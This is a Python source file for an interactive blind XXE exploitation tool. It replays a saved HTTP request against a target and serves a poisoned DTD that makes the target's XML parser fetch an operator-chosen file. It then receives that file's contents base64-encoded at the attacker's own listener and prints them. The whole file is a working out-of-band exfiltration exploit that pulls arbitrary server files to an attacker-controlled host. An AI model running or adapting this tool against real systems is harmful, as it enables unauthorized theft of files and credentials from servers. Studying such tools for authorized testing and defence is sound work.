import argparse
import threading
import time
from cmd import Cmd
import http.server
from base64 import b64decode
from urllib.parse import urlparse, parse_qs

import requests
from rich.console import Console
from rich.panel import Panel
from rich.text import Text


def parse_args():
    parser = argparse.ArgumentParser(description="Blind XXE OOB listener/exfil tool")
    parser.add_argument(
        "-l", "--lhost", required=True, help="Attacker IP for the OOB callback URL"
    )
    parser.add_argument(
        "-p", "--lport", type=int, default=8000, help="Port to listen on (default: 8000)"
    )
    parser.add_argument(
        "-r", "--req", default="xxe.req", help="Path to the raw request file (default: xxe.req)"
    )
    return parser.parse_args()


args = parse_args()

console = Console()

payload = "Dummy string"
decoded = "Dummy string"
REQ_FILE = args.req

# Some XML parsers resolve the OOB parameter entity twice for a single
# request (once loading the DTD, once expanding it), producing two
# identical requests within milliseconds. Suppress the repeat print.
DEDUPE_WINDOW = 2  # seconds
_seen_content: dict[str, float] = {}


def load_request(path=REQ_FILE):
    """Parse a raw HTTP request (as saved by Burp) into method/target/headers/body."""
    with open(path) as f:
        raw = f.read()

    header, body = raw.split("\n\n")

    header = header.split("\n")

    method, target, _ = header[0].split(" ")

    headers = {}

    for line in header[1:]:
        key, _, value = line.partition(":")
        headers[key.strip()] = value.strip()

    return method, target, headers, body


def send_request():
    """Fire the parsed .req against its target host, triggering the OOB fetch."""
    method, target, headers, body = load_request()

    host = headers.pop("Host")
    headers.pop("Content-Length", None)
    scheme = "https" if headers.get("Origin", "").startswith("https") else "http"
    url = f"{scheme}://{host}{target}"

    try:
        resp = requests.request(method, url, headers=headers, data=body, timeout=10)
        console.print(
            f"[cyan]Sending request to[/cyan] {url} [cyan]->[/cyan]{resp.status_code} "
        )
        console.print(
            Panel(Text(decoded), title="Decoded Content", border_style="green")
        )
        console.print(terminal.prompt, end="", highlight=False)
    except requests.RequestException as exc:
        console.print(f"[red]Request failed:[/red] {exc}")


class RequestHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        with open("server.log", "a") as f:
            f.write(
                "%s - - [%s] %s\n"
                % (self.address_string(), self.log_date_time_string(), format % args)
            )

    def do_GET(self):
        """This function sends a custom poisoned .dtd file, and decodes the response"""
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.end_headers()

        if self.path.endswith(".dtd"):
            # Make payload for DTD
            self.wfile.write(payload.encode("utf-8"))
            return

        elif "content" in self.path:
            global decoded
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)

            b64_value = params["content"][0]
            now = time.time()
            last_seen = _seen_content.get(b64_value)
            _seen_content[b64_value] = now
            if last_seen is not None and now - last_seen < DEDUPE_WINDOW:
                return

            decoded = b64decode(b64_value).decode()
            return
        else:
            console.print(f"[yellow]Unintended request:[/yellow] {self.path}")
            console.print(terminal.prompt, end="", highlight=False)
            return


class Terminal(Cmd):
    prompt = "xxe> "

    def default(self, line):
        global payload

        # To update the xxe with the user required file dynamically
        with open("xxe.dtd") as f:
            temp_payload = (
                f.read()
                .replace("{line}", line)
                .replace("{lhost}", args.lhost)
                .replace("{lport}", str(args.lport))
            )

        payload = temp_payload
        console.print(f"[cyan]Target file set:[/cyan] {line}")
        send_request()

    def do_exit(self, arg):
        exit()


def run():
    server_address = ("", args.lport)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()


t = threading.Thread(target=run)
t.daemon = True
t.start()

terminal = Terminal()
terminal.cmdloop()
